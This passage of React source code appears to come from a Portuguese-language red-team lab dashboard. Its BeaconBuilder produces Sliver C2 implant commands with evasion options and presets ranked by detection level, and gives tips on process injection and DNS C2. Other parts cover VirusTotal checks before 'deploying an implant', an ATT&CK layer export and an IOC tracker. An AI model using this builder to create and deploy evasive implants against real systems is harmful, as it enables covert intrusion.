              {stats.topPorts.length === 0 ? <div className="text-[11px] text-cyber-muted">Sem dados</div> : (
                <div className="space-y-2">
                  {stats.topPorts.map(([port, count]) => {
                    const maxC = stats.topPorts[0]?.[1] || 1;
                    return (
                      <div key={port}>
                        <div className="flex justify-between text-[11px] mb-0.5">
                          <span className="text-cyber-text font-mono">{port}</span>
                          <span className="text-cyber-muted">{count}</span>
                        </div>
                        <div className="h-1 bg-cyber-border rounded-sm"><div className="h-full bg-cyber-accent rounded-sm" style={{ width: `${(count / maxC) * 100}%` }} /></div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>

            {/* Top Services */}
            <div className={CARD}>
              <div className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest mb-3">TOP 10 SERVIÇOS</div>
              {stats.topSvc.length === 0 ? <div className="text-[11px] text-cyber-muted">Sem dados</div> : (
                <div className="space-y-2">
                  {stats.topSvc.map(([svc, count]) => {
                    const maxC = stats.topSvc[0]?.[1] || 1;
                    return (
                      <div key={svc}>
                        <div className="flex justify-between text-[11px] mb-0.5">
                          <span className="font-mono" style={{ color: svcColor(svc) }}>{svc}</span>
                          <span className="text-cyber-muted">{count}</span>
                        </div>
                        <div className="h-1 bg-cyber-border rounded-sm"><div className="h-full rounded-sm" style={{ background: svcColor(svc), width: `${(count / maxC) * 100}%` }} /></div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            {/* OS Distribution */}
            <div className={CARD}>
              <div className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest mb-3">SISTEMAS OPERACIONAIS</div>
              {stats.topOS.length === 0 ? <div className="text-[11px] text-cyber-muted">Nenhum OS detectado ainda</div> : (
                <div className="space-y-2">
                  {stats.topOS.map(([os, count]) => (
                    <div key={os} className="flex items-center justify-between">
                      <span className="text-[11px] text-cyber-text">{os === "Windows" ? "" : os === "Linux" ? "" : os === "macOS" ? "" : ""} {os}</span>
                      <span className="text-[11px] text-cyber-muted font-mono">{count}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* Most Exposed */}
            <div className={CARD}>
              <div className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest mb-3">HOSTS MAIS EXPOSTOS</div>
              {stats.mostExposed.length === 0 ? <div className="text-[11px] text-cyber-muted">Sem dados</div> : (
                <div className="space-y-1.5">
                  {stats.mostExposed.filter(h => h.total > 0).map((h, i) => (
                    <div key={h.host} className="flex items-center justify-between cursor-pointer hover:text-cyber-accent" onClick={() => setHostDetail(h.host)}>
                      <span className="text-[11px] font-mono text-cyber-text">#{i + 1} {h.host}</span>
                      <span className="text-[11px] font-mono" style={{ color: h.total >= 10 ? "#ef4444" : h.total >= 5 ? "#f59e0b" : "#22c55e" }}>{h.total} portas</span>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

// ─── VirusTotal Lookup ────────────────────────────────────────────────────
function VirusTotalLookup() {
  const [hash, setHash] = useState("");
  const [result, setResult] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);

  const lookup = async () => {
    const h = hash.trim();
    if (!h) return;
    setLoading(true);
    setError(null);
    setResult(null);
    try {
      const { data: { session } } = await supabase.auth.getSession();
      const res = await fetch(`/api/vt?hash=${encodeURIComponent(h)}`, {
        headers: { Authorization: `Bearer ${session?.access_token || ""}` },
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || `Erro ${res.status}`);
      setResult(data);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  const hashFromFile = (e) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = async (ev) => {
      const buf = ev.target.result;
      const hashBuf = await crypto.subtle.digest("SHA-256", buf);
      const arr = Array.from(new Uint8Array(hashBuf));
      setHash(arr.map(b => b.toString(16).padStart(2, "0")).join(""));
    };
    reader.readAsArrayBuffer(file);
  };

  const detColor = (mal, total) => {
    if (!total) return "#64748B";
    const ratio = mal / total;
    if (ratio === 0) return "#22c55e";
    if (ratio < 0.2) return "#f59e0b";
    if (ratio < 0.5) return "#f97316";
    return "#ef4444";
  };

  return (
    <div>
      <InfoBox title={SECTION_INFO.virustotal.title} icon={SECTION_INFO.virustotal.icon}>{SECTION_INFO.virustotal.content}</InfoBox>
      <div className="text-[11px] text-cyber-muted/70 mb-4">Consulte um hash (SHA-256 / MD5 / SHA-1) no VirusTotal para checar detecção antes de deployar um implant.</div>

      <div className="flex gap-2 items-end mb-4">
        <div className="flex-1">
          <label className={LABEL}>Hash do arquivo</label>
          <input className={INPUT} placeholder="SHA-256, MD5 ou SHA-1" value={hash} onChange={e => setHash(e.target.value)} />
        </div>
        <label className={`${BTN_GHOST} cursor-pointer`}>
           Arquivo
          <input type="file" className="hidden" onChange={hashFromFile} />
        </label>
        <button onClick={lookup} disabled={!hash.trim() || loading} className={`${BTN} disabled:opacity-40`}>
          {loading ? "BUSCANDO..." : "CONSULTAR VT"}
        </button>
      </div>

      {error && <div className="text-cyber-danger text-xs mb-3">{error}</div>}

      {result && (
        <div className={CARD}>
          <div className="flex items-center justify-between mb-3">
            <span className="text-sm font-bold text-cyber-text">{result.meaningful_name || result.name || "Arquivo"}</span>
            {result.last_analysis_stats && (() => {
              const s = result.last_analysis_stats;
              const mal = s.malicious || 0;
              const total = (s.malicious || 0) + (s.undetected || 0) + (s.harmless || 0) + (s.suspicious || 0);
              return (
                <span className="text-base font-bold font-mono" style={{ color: detColor(mal, total) }}>
                  {mal}/{total} detecções
                </span>
              );
            })()}
          </div>

          {result.last_analysis_stats && (
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 mb-3">
              {[
                { key: "malicious", label: "Malicioso", color: "#ef4444" },
                { key: "suspicious", label: "Suspeito", color: "#f59e0b" },
                { key: "undetected", label: "Não detectado", color: "#22c55e" },
                { key: "harmless", label: "Inofensivo", color: "#64748B" },
              ].map(({ key, label, color }) => (
                <div key={key} className="text-center py-2 rounded border border-cyber-border">
                  <div className="text-lg font-bold font-mono" style={{ color }}>{result.last_analysis_stats[key] || 0}</div>
                  <div className="text-[10px] text-cyber-muted">{label}</div>
                </div>
              ))}
            </div>
          )}

          <div className="grid grid-cols-2 gap-2 text-[11px]">
            {result.type_description && <div className="text-cyber-muted">Tipo: <span className="text-cyber-text">{result.type_description}</span></div>}
            {result.size && <div className="text-cyber-muted">Tamanho: <span className="text-cyber-text">{(result.size / 1024).toFixed(1)} KB</span></div>}
            {result.sha256 && <div className="col-span-2 text-cyber-muted font-mono break-all">SHA-256: <span className="text-cyber-text">{result.sha256}</span></div>}
          </div>

          {result.popular_threat_classification && (
            <div className="mt-3 pt-3 border-t border-cyber-border">
              <div className="text-[10px] font-mono text-cyber-muted mb-1">CLASSIFICAÇÃO</div>
              {result.popular_threat_classification.suggested_threat_label && (
                <span className="text-xs px-2 py-0.5 bg-[#2a0f0f] text-[#ef4444] border border-[#ef4444]/30 rounded font-mono">
                  {result.popular_threat_classification.suggested_threat_label}
                </span>
              )}
            </div>
          )}
        </div>
      )}
    </div>
  );
}

// ─── BeaconBuilder ─────────────────────────────────────────────────────────
const BB_PROTOCOLS = [
  { id: "http", label: "--http", desc: "HTTP puro — funciona em redes restritas, mas tráfego visível em proxies e IDSes. Fácil de inspecionar.", mitre: ["T1071.001"], detScore: 4 },
  { id: "https", label: "--https", desc: "HTTPS — tráfego cifrado, parece navegação normal. Boa escolha padrão para ambientes corporativos.", mitre: ["T1071.001"], detScore: 3 },
  { id: "mtls", label: "--mtls", desc: "mTLS — autenticação mútua com certificados. Muito difícil de interceptar. Cria menos IOCs na rede.", mitre: ["T1071.001"], detScore: 2 },
  { id: "dns", label: "--dns", desc: "DNS — C2 via consultas DNS. Bypassea firewalls L7 que bloqueiam HTTP/HTTPS. Muito lento (~1 KB/s).", mitre: ["T1071.004"], detScore: 1 },
];

const BB_EVASION = [
  { id: "garble", flag: "--evasion", label: "Garble (--evasion)", desc: "Ofusca código Go: renomeia símbolos, embaralha strings, remove informação identificável do binário.", mitre: ["T1027"], detMod: -0.7 },
  { id: "nosym", flag: "--skip-symbols", label: "Sem símbolos (--skip-symbols)", desc: "Remove tabela de debug do binário. Dificulta análise estática e engenharia reversa.", mitre: ["T1027"], detMod: -0.3 },
  { id: "shellcode", flag: "--format shellcode", label: "Shellcode (--format shellcode)", desc: "Shellcode puro — nunca toca o disco como EXE. Precisa de loader externo (ex: Donut, SRDIbrary).", mitre: ["T1620"], detMod: -1 },
  { id: "dll", flag: "--format shared", label: "DLL (--format shared)", desc: "Gera .dll injetável em outros processos via LoadLibrary ou reflective injection. Sem EXE autônomo.", mitre: ["T1055"], detMod: -0.8 },
];

const BB_PLATFORMS = [
  { id: "win64", os: "windows", arch: "amd64", label: "Windows x64", icon: "-"},
  { id: "win32", os: "windows", arch: "386", label: "Windows x86", icon: "-"},
  { id: "linux64", os: "linux", arch: "amd64", label: "Linux x64", icon: "-"},
  { id: "darwin", os: "darwin", arch: "arm64", label: "macOS ARM", icon: "-"},
];

const BB_TIMING = [
  { id: "fast", s: 30, j: 10, label: "Rápido (30s)", desc: "Responsivo mas ruidoso — padrão periódico detectável por baseline de rede ou SIEM.", detMod: 0.5 },
  { id: "normal", s: 60, j: 30, label: "Normal (60s)", desc: "Equilíbrio padrão. Boa responsividade com alguma furtividade no tempo.", detMod: 0 },
  { id: "slow", s: 300, j: 60, label: "Furtivo (5min)", desc: "Difícil detectar por padrão temporal. Boa escolha para operações longas.", detMod: -0.5 },
  { id: "ultra", s: 3600, j: 300, label: "Ultra-furtivo (1h)", desc: "Quase invisível por padrão de tempo. Muito lento — ideal para persistência passiva de longo prazo.", detMod: -1 },
];

const BB_PRESETS = [
  {
    id: "basic",
    name: " Básico",
    det: "ALTO",
    desc: "EXE padrão sem evasão. Windows Defender vai detectar. Use para entender a baseline e ver o que o AV flageia.",
    implantType: "beacon", proto: "http", evasion: [], platform: "win64", timing: "normal",
    tip: "Perfeito para capturar logs de detecção do Windows Event Log e entender quais strings/comportamentos ativam o AV. Compare com os presets seguintes para medir o ganho de cada técnica de evasão.",
  },
  {
    id: "garble",
    name: " Garble + HTTPS",
    det: "MÉDIO",
    desc: "Garble ofusca o código Go + HTTPS cifra o tráfego. Reduz detecção por assinatura estática. EDR comportamental ainda pode pegar.",
    implantType: "beacon", proto: "https", evasion: ["garble", "nosym"], platform: "win64", timing: "normal",
    tip: "Testa no VirusTotal antes de usar em operação. Monitorar com Procmon/Sysmon para ver chamadas de rede e processos filhos suspeitos. Strings do Sliver no binário ainda podem ser flagradas por regras YARA.",
  },
  {
    id: "shellcode",
    name: " Shellcode",
    det: "BAIXO",
    desc: "Shellcode injetado em memória por um loader. Nunca cria EXE no disco. Requer ferramenta de injeção separada.",
    implantType: "beacon", proto: "mtls", evasion: ["garble", "nosym", "shellcode"], platform: "win64", timing: "slow",
    tip: "Usa ferramentas como Donut (converte shellcode pra .NET/PS) ou SRDIbrary. Injeta em processos legítimos como explorer.exe, svchost.exe (T1055). mTLS garante que o C2 seja quase invisível para análise de rede.",
  },
  {
    id: "dns",
    name: " DNS Furtivo",
    det: "ULTRA BAIXO",
    desc: "C2 via DNS queries. Bypassea firewalls que bloqueiam HTTP/HTTPS saindo. Requer domínio real com NS apontando pro teamserver.",
    implantType: "beacon", proto: "dns", evasion: ["garble", "nosym"], platform: "win64", timing: "ultra",
    tip: "Configura listener DNS no Sliver: `dns -d seudominio.com`. Precisa de domínio real com records NS e A apontando pra IP do teamserver. Muito lento — use só para persistência passiva, nunca para exfil de arquivos grandes.",
  },
];

const BB_DET_MAP = {
  "ALTO":       { color: "#ef4444", bg: "#2a0f0f", icon: "-"},
  "MÉDIO":      { color: "#f59e0b", bg: "#2a1f0a", icon: "-"},
  "BAIXO":      { color: "#22c55e", bg: "#0d2818", icon: "-"},
  "ULTRA BAIXO": { color: "#94a3b8", bg: "#1e293b", icon: "-"},
};

function bbComputeDetection(proto, evasion, timing, implantType) {
  const protoData = BB_PROTOCOLS.find(p => p.id === proto);
  const base = protoData?.detScore ?? 3;
  const evMod = evasion.reduce((sum, eid) => {
    return sum + (BB_EVASION.find(x => x.id === eid)?.detMod ?? 0);
  }, 0);
  const timingData = BB_TIMING.find(t => t.id === timing);
  const timeMod = implantType === "beacon" ? (timingData?.detMod ?? 0) : 0.5;
  const score = base + evMod + timeMod;
  if (score <= 1) return "ULTRA BAIXO";
  if (score <= 2) return "BAIXO";
  if (score <= 3) return "MÉDIO";
  return "ALTO";
}

function bbBuildCmd(implantType, proto, c2addr, evasion, platform, timing) {
  const plt = BB_PLATFORMS.find(p => p.id === platform);
  const tm = BB_TIMING.find(t => t.id === timing);
  const hasShellcode = evasion.includes("shellcode");
  const hasDll = evasion.includes("dll");
  const c2val = c2addr.trim() || (proto === "dns" ? "<seu-dominio.com>" : "<IP>:<PORTA>");
  const parts = ["generate"];
  if (implantType === "beacon") parts.push("beacon");
  parts.push(`--${proto}`, c2val);
  if (plt) { parts.push("--os", plt.os, "--arch", plt.arch); }
  for (const eid of evasion) {
    if (eid === "shellcode" || eid === "dll") continue;
    const e = BB_EVASION.find(x => x.id === eid);
    if (e) parts.push(e.flag);
  }
  if (hasShellcode) { parts.push("--format", "shellcode"); }
  else if (hasDll) { parts.push("--format", "shared"); }
  if (implantType === "beacon" && tm) { parts.push("--seconds", String(tm.s), "--jitter", String(tm.j)); }
  return parts.join(" ");
}

function bbAllMitre(proto, evasion) {
  const protMitre = BB_PROTOCOLS.find(p => p.id === proto)?.mitre ?? [];
  const evMitre = evasion.flatMap(eid => BB_EVASION.find(x => x.id === eid)?.mitre ?? []);
  return [...new Set([...protMitre, ...evMitre])];
}

function BeaconBuilder() {
  const [implantType, setImplantType] = useState("beacon");
  const [proto, setProto] = useState("http");
  const [c2addr, setC2addr] = useState("");
  const [evasion, setEvasion] = useState([]);
  const [platform, setPlatform] = useState("win64");
  const [timing, setTiming] = useState("normal");
  const [copied, setCopied] = useState(false);
  const [activePreset, setActivePreset] = useState(null);

  const applyPreset = (preset) => {
    setImplantType(preset.implantType);
    setProto(preset.proto);
    setEvasion(preset.evasion);
    setPlatform(preset.platform);
    setTiming(preset.timing);
    setActivePreset(preset.id);
  };

  const toggleEvasion = (id) => {
    setActivePreset(null);
    if (id === "shellcode") {
      setEvasion(prev => prev.includes("shellcode")
        ? prev.filter(e => e !== "shellcode")
        : [...prev.filter(e => e !== "dll"), "shellcode"]);
    } else if (id === "dll") {
      setEvasion(prev => prev.includes("dll")
        ? prev.filter(e => e !== "dll")
        : [...prev.filter(e => e !== "shellcode"), "dll"]);
    } else {
      setEvasion(prev => prev.includes(id) ? prev.filter(e => e !== id) : [...prev, id]);
    }
  };

  const cmd = bbBuildCmd(implantType, proto, c2addr, evasion, platform, timing);
  const detLevel = bbComputeDetection(proto, evasion, timing, implantType);
  const detInfo = BB_DET_MAP[detLevel];
  const allMitre = bbAllMitre(proto, evasion);
  const activePresetData = BB_PRESETS.find(p => p.id === activePreset);

  const copyCmd = () => {
    navigator.clipboard.writeText(cmd).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  };

  const blockBtn = (selected) =>
    `border rounded-md px-3 py-2 text-xs font-mono cursor-pointer transition-all ${selected
      ? "border-cyber-accent text-cyber-accent bg-[#0a1a12]"
      : "border-cyber-border text-cyber-muted hover:border-cyber-text hover:text-cyber-text bg-transparent"}`;

  const sectionTitle = "text-[10px] font-mono font-bold text-cyber-muted tracking-widest uppercase";

  return (
    <div>
      <InfoBox title={SECTION_INFO["beacon-lab"].title} icon={SECTION_INFO["beacon-lab"].icon}>{SECTION_INFO["beacon-lab"].content}</InfoBox>
      <div className="mb-5">
        <div className="text-[11px] text-cyber-muted/70">Monte seu implant Sliver bloco a bloco e entenda o impacto de cada opção na detecção e nas técnicas MITRE cobertas.</div>
      </div>

      {/* Presets */}
      <div className="mb-5">
        <div className={sectionTitle + " mb-2"}> RECEITAS PRONTAS</div>
        <div className="grid grid-cols-2 gap-2 sm:grid-cols-4">
          {BB_PRESETS.map(p => {
            const di = BB_DET_MAP[p.det];
            const active = activePreset === p.id;
            return (
              <button
                key={p.id}
                onClick={() => applyPreset(p)}
                className={`border rounded-lg p-3 text-left cursor-pointer transition-all ${active ? "border-cyber-accent bg-[#0a1a12]" : "border-cyber-border hover:border-cyber-text bg-cyber-surface"}`}
              >
                <div className="text-sm font-bold text-cyber-text mb-1.5">{p.name}</div>
                <div className="text-[10px] px-2 py-0.5 rounded inline-block mb-2 border font-mono font-bold" style={{ color: di.color, borderColor: di.color, background: di.bg }}>{p.det}</div>
                <div className="text-[10px] text-cyber-muted leading-relaxed">{p.desc}</div>
              </button>
            );
          })}
        </div>
      </div>

      <div className="grid grid-cols-1 gap-5 lg:grid-cols-[1fr_300px]">
        {/* Left: Builder */}
        <div className="space-y-5">
          {/* Type */}
          <div>
            <div className={sectionTitle + " mb-2"}>TIPO DE IMPLANT</div>
            <div className="flex gap-2">
              <button onClick={() => { setImplantType("beacon"); setActivePreset(null); }} className={blockBtn(implantType === "beacon")}> BEACON (assíncrono)</button>
              <button onClick={() => { setImplantType("session"); setActivePreset(null); }} className={blockBtn(implantType === "session")}> SESSION (interativo)</button>
            </div>
            <div className="text-[11px] text-cyber-muted mt-1.5">
              {implantType === "beacon"
                ? "Check-in periódico. O beacon acorda, executa tarefas e dorme de volta. Muito mais furtivo que session."
                : "Conexão persistente em tempo real. Permite respostas imediatas, mas é mais barulhento na rede."}
            </div>
          </div>

          {/* Protocol */}
          <div>
            <div className={sectionTitle + " mb-2"}>PROTOCOLO C2</div>
            <div className="flex gap-2 flex-wrap">
              {BB_PROTOCOLS.map(p => (
                <button key={p.id} onClick={() => { setProto(p.id); setActivePreset(null); }} className={blockBtn(proto === p.id)}>{p.label}</button>
              ))}
            </div>
            <div className="text-[11px] text-cyber-muted mt-1.5">{BB_PROTOCOLS.find(p => p.id === proto)?.desc}</div>
          </div>

          {/* C2 Address */}
          <div>
            <div className={sectionTitle + " mb-2"}>ENDEREÇO C2</div>
            <input
              className={INPUT}
              placeholder={proto === "dns" ? "ex: c2.seudominio.com" : "ex: 192.168.0.100:443"}
              value={c2addr}
              onChange={e => setC2addr(e.target.value)}
            />
            {proto === "dns" && (
              <div className="text-[11px] text-amber-400/80 mt-1.5"> DNS requer domínio real com registro NS apontando pro IP do teamserver. Configure com: <code className="text-cyber-accent">dns -d seudominio.com</code></div>
            )}
          </div>

          {/* Platform */}
          <div>
            <div className={sectionTitle + " mb-2"}>PLATAFORMA ALVO</div>
            <div className="flex gap-2 flex-wrap">
              {BB_PLATFORMS.map(p => (
                <button key={p.id} onClick={() => { setPlatform(p.id); setActivePreset(null); }} className={blockBtn(platform === p.id)}>{p.icon} {p.label}</button>
              ))}
            </div>
          </div>

          {/* Evasion */}
          <div>
            <div className={sectionTitle + " mb-2"}>TÉCNICAS DE EVASÃO <span className="text-cyber-muted/50 normal-case font-normal">(clique para ativar/desativar)</span></div>
            <div className="grid grid-cols-2 gap-2">
              {BB_EVASION.map(e => {
                const sel = evasion.includes(e.id);
                return (
                  <button
                    key={e.id}
                    onClick={() => toggleEvasion(e.id)}
                    className={`border rounded-lg p-3 text-left cursor-pointer transition-all ${sel ? "border-cyber-accent bg-[#0a1a12]" : "border-cyber-border hover:border-cyber-text bg-cyber-surface"}`}
                  >
                    <div className={`text-[11px] font-mono font-bold mb-1 ${sel ? "text-cyber-accent" : "text-cyber-text"}`}>
                      {sel ? " " : ""}{e.label}
                    </div>
                    <div className="text-[10px] text-cyber-muted leading-relaxed">{e.desc}</div>
                    <div className="mt-2 flex gap-1 flex-wrap">
                      {e.mitre.map(m => (
                        <span key={m} className="text-[9px] px-1.5 py-0.5 bg-[#1a1a2e] text-indigo-400 border border-indigo-400/40 rounded font-mono">{m}</span>
                      ))}
                    </div>
                  </button>
                );
              })}
            </div>
            {(evasion.includes("shellcode") || evasion.includes("dll")) && (
              <div className="text-[11px] text-amber-400/80 mt-2 px-2"> Shellcode e DLL são mutuamente exclusivos — apenas um formato pode ser selecionado por vez.</div>
            )}
          </div>

          {/* Timing (beacon only) */}
          {implantType === "beacon" && (
            <div>
              <div className={sectionTitle + " mb-2"}>TIMING DO BEACON</div>
              <div className="grid grid-cols-2 gap-2">
                {BB_TIMING.map(t => {
                  const sel = timing === t.id;
                  return (
                    <button
                      key={t.id}
                      onClick={() => { setTiming(t.id); setActivePreset(null); }}
                      className={`border rounded-lg p-3 text-left cursor-pointer transition-all ${sel ? "border-cyber-accent bg-[#0a1a12]" : "border-cyber-border hover:border-cyber-text bg-cyber-surface"}`}
                    >
                      <div className={`text-[11px] font-mono font-bold mb-1 ${sel ? "text-cyber-accent" : "text-cyber-text"}`}>{t.label}</div>
                      <div className="text-[10px] text-cyber-muted">{t.desc}</div>
                      <div className="text-[10px] text-cyber-muted/50 mt-1">--seconds {t.s} --jitter {t.j}</div>
                    </button>
                  );
                })}
              </div>
            </div>
          )}
        </div>

        {/* Right: Command + Analysis */}
        <div className="space-y-4">
          {/* Generated Command */}
          <div className={CARD}>
            <div className={sectionTitle + " mb-2"}>COMANDO GERADO</div>
            <div className="text-[10px] text-cyber-muted mb-2 font-mono">Cole no terminal do Sliver (teamserver)</div>
            <div className="bg-black/60 border border-cyber-border rounded p-3 font-mono text-[11px] text-cyber-accent break-all leading-relaxed whitespace-pre-wrap">
              {cmd}
            </div>
            <button onClick={copyCmd} className={`${BTN} w-full mt-2 text-[11px]`}>
              {copied ? " COPIADO!" : " COPIAR COMANDO"}
            </button>
          </div>

          {/* Detection Level */}
          <div className={CARD} style={{ borderColor: detInfo.color + "60" }}>
            <div className={sectionTitle + " mb-2"}>NÍVEL DE DETECÇÃO (estimado)</div>
            <div className="flex items-center gap-3">
              <span className="text-2xl">{detInfo.icon}</span>
              <div>
                <div className="text-base font-bold font-mono" style={{ color: detInfo.color }}>{detLevel}</div>
                <div className="text-[10px] text-cyber-muted">Baseado em protocolo + evasão + timing</div>
              </div>
            </div>
          </div>

          {/* MITRE Coverage */}
          <div className={CARD}>
            <div className={sectionTitle + " mb-2"}>TÉCNICAS MITRE COBERTAS</div>
            {allMitre.length === 0 ? (
              <div className="text-[11px] text-cyber-muted">—</div>
            ) : (
              <div className="flex flex-wrap gap-1.5 mt-1">
                {allMitre.map(m => (
                  <a key={m} href={mitreUrl(m)} target="_blank" rel="noreferrer"
                    className="text-[10px] px-2 py-0.5 bg-[#1a1a2e] text-indigo-400 border border-indigo-400/50 rounded font-mono hover:underline">
                    {m}
                  </a>
                ))}
              </div>
            )}
          </div>

          {/* Active Preset Tip */}
          {activePresetData?.tip && (
            <div className={CARD}>
              <div className={sectionTitle + " mb-2"}> DICA DA RECEITA</div>
              <div className="text-[11px] text-cyber-muted leading-relaxed">{activePresetData.tip}</div>
            </div>
          )}

          {/* How to use */}
          <div className={CARD}>
            <div className={sectionTitle + " mb-2"}>COMO USAR</div>
            <ol className="text-[11px] text-cyber-muted space-y-2 list-none">
              <li>1. Inicie um listener compatível no Sliver:<br /><code className="text-cyber-accent text-[10px]">{proto === "dns" ? `dns -d ${c2addr || "seudominio.com"}` : `${proto} -L 0.0.0.0 -l ${proto === "https" ? "443" : proto === "mtls" ? "8888" : "80"}`}</code></li>
              <li>2. Cole o comando acima no terminal do Sliver (teamserver)</li>
              <li>3. Transfira e execute o implant gerado na máquina alvo</li>
              <li>4. O beacon aparece na aba <span className="text-cyber-accent">Conexões (Sliver)</span> após o primeiro check-in</li>
            </ol>
          </div>
        </div>
      </div>
    </div>
  );
}

// ─── ATT&CK Navigator Export ──────────────────────────────────────────────
function NavigatorExport({ techniques }) {
  const exportLayer = () => {
    const techMap = {};
    techniques.forEach(t => {
      if (!t.mitre_id) return;
      const id = t.mitre_id.trim().toUpperCase();
      if (!techMap[id]) techMap[id] = { count: 0, success: 0, tools: new Set() };
      techMap[id].count++;
      if (t.success) techMap[id].success++;
      techMap[id].tools.add(t.tool_used);
    });

    const layer = {
      name: "CyberLab - Cobertura MITRE ATT&CK",
      versions: { attack: "14", navigator: "4.9.1", layer: "4.5" },
      domain: "enterprise-attack",
      description: `Gerado pelo CyberLab em ${new Date().toLocaleString("pt-BR")}. ${techniques.length} técnicas registradas.`,
      sorting: 3,
      layout: { layout: "side", aggregateFunction: "average", showID: true, showName: true },
      hideDisabled: false,
      techniques: Object.entries(techMap).map(([id, info]) => {
        const base = id.includes(".") ? id.split(".")[0] : id;
        const sub = id.includes(".") ? id.split(".")[1] : undefined;
        const score = Math.min(100, info.count * 20);
        return {
          techniqueID: base,
          ...(sub ? { tactic: undefined } : {}),
          score,
          color: info.success > 0 ? "" : "#ff6666",
          comment: `${info.count}x executada (${info.success} sucesso) | Tools: ${[...info.tools].join(", ")}`,
          enabled: true,
          metadata: [],
          links: [],
          showSubtechniques: !!sub,
        };
      }),
      gradient: { colors: ["#ce1127", "#ff6b6b", "#66b2ff"], minValue: 0, maxValue: 100 },
      legendItems: [
        { label: "Praticada com sucesso", color: "#ce1127" },
        { label: "Praticada (falhou)", color: "#ff6666" },
      ],
      showTacticRowBackground: true,
      tacticRowBackground: "#1a1a2e",
      selectTechniquesAcrossTactics: true,
    };

    const blob = new Blob([JSON.stringify(layer, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "cyberlab-navigator-layer.json";
    a.click();
    URL.revokeObjectURL(url);
  };

  const uniqueMitre = new Set(techniques.filter(t => t.mitre_id).map(t => t.mitre_id.trim().toUpperCase()));
  const tacticsCovered = new Set(techniques.map(t => t.tactic));

  return (
    <div>
      <InfoBox title={SECTION_INFO.navigator.title} icon={SECTION_INFO.navigator.icon}>{SECTION_INFO.navigator.content}</InfoBox>

      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-4">
        {[
          { label: "Técnicas Únicas", val: uniqueMitre.size, cls: "text-cyber-accent" },
          { label: "Total Executadas", val: techniques.length, cls: "text-blue-400" },
          { label: "Táticas Cobertas", val: tacticsCovered.size, cls: "text-purple-400" },
          { label: "Taxa Sucesso", val: techniques.length ? Math.round(techniques.filter(t => t.success).length / techniques.length * 100) + "%" : "0%", cls: "text-amber-400" },
        ].map(s => (
          <div key={s.label} className={`${CARD} text-center`}>
            <div className={`text-xl font-extrabold ${s.cls}`}>{s.val}</div>
            <div className="text-[10px] text-cyber-muted mt-1">{s.label}</div>
          </div>
        ))}
      </div>

      <div className={CARD + " mb-4"}>
        <div className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest mb-3">TÉCNICAS NO LAYER</div>
        {uniqueMitre.size === 0 ? <div className="text-[11px] text-cyber-muted">Nenhuma técnica com MITRE ID registrada ainda.</div> : (
          <div className="flex flex-wrap gap-1.5 mb-4">
            {[...uniqueMitre].sort().map(id => (
              <a key={id} href={mitreUrl(id)} target="_blank" rel="noreferrer" className="text-[10px] px-2 py-0.5 bg-[#1a1a2e] text-indigo-400 border border-indigo-400/40 rounded font-mono hover:underline">{id}</a>
            ))}
          </div>
        )}
        <button onClick={exportLayer} disabled={uniqueMitre.size === 0} className={`${BTN} disabled:opacity-40`}> Baixar Layer JSON para o Navigator</button>
        <div className="text-[10px] text-cyber-muted mt-2">Abra em <a href="https://mitre-attack.github.io/attack-navigator/" target="_blank" rel="noreferrer" className="text-cyber-accent hover:underline">mitre-attack.github.io/attack-navigator</a> → Open Existing Layer → Upload from local</div>
      </div>
    </div>
  );
}

// ─── IOC Tracker ──────────────────────────────────────────────────────────
const IOC_TYPES = [
  { id: "hash-md5", label: "Hash MD5", icon: "#" },
  { id: "hash-sha1", label: "Hash SHA1", icon: "#" },
  { id: "hash-sha256", label: "Hash SHA256", icon: "#" },
  { id: "ip", label: "IP Address", icon: "-"},
  { id: "domain", label: "Domínio", icon: "-"},
  { id: "url", label: "URL", icon: "-"},
  { id: "email", label: "E-mail", icon: "-"},
  { id: "filename", label: "Filename", icon: "-"},
  { id: "registry", label: "Registry Key", icon: "-"},
  { id: "sigma", label: "Regra Sigma", icon: "-"},
  { id: "yara", label: "Regra Yara", icon: "-"},
  { id: "other", label: "Outro", icon: "-"},
];

function IocTracker({ sessions }) {
  const [iocs, setIocs] = useState([]);
  const [loading, setLoading] = useState(true);
  const [showNew, setShowNew] = useState(false);
  const [filter, setFilter] = useState("all");
  const [form, setForm] = useState({ ioc_type: "hash-sha256", value: "", description: "", source: "", session_id: "" });

  useEffect(() => {
    fetchIocs().then(setIocs).catch(() => {}).finally(() => setLoading(false));
  }, []);

  const create = async () => {
    if (!form.value.trim()) return;
    const ioc = await createIoc(form);
    setIocs([ioc, ...iocs]);
    setShowNew(false);
    setForm({ ioc_type: "hash-sha256", value: "", description: "", source: "", session_id: "" });
  };

  const remove = async (id) => {
    await deleteIoc(id);
    setIocs(iocs.filter(i => i.id !== id));
  };

  const filtered = filter === "all" ? iocs : iocs.filter(i => i.ioc_type === filter);
  const typeCounts = {};
  iocs.forEach(i => { typeCounts[i.ioc_type] = (typeCounts[i.ioc_type] || 0) + 1; });

  return (
    <div>
      <InfoBox title={SECTION_INFO.ioc.title} icon={SECTION_INFO.ioc.icon}>{SECTION_INFO.ioc.content}</InfoBox>

      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-2 mb-4">
        <div className="flex flex-wrap gap-1">
          <button onClick={() => setFilter("all")} className={`text-[10px] px-2 py-1 rounded font-mono border cursor-pointer ${filter === "all" ? "bg-cyber-accent text-white border-cyber-accent" : "bg-transparent text-cyber-muted border-cyber-border"}`}>Todos ({iocs.length})</button>
          {IOC_TYPES.filter(t => typeCounts[t.id]).map(t => (
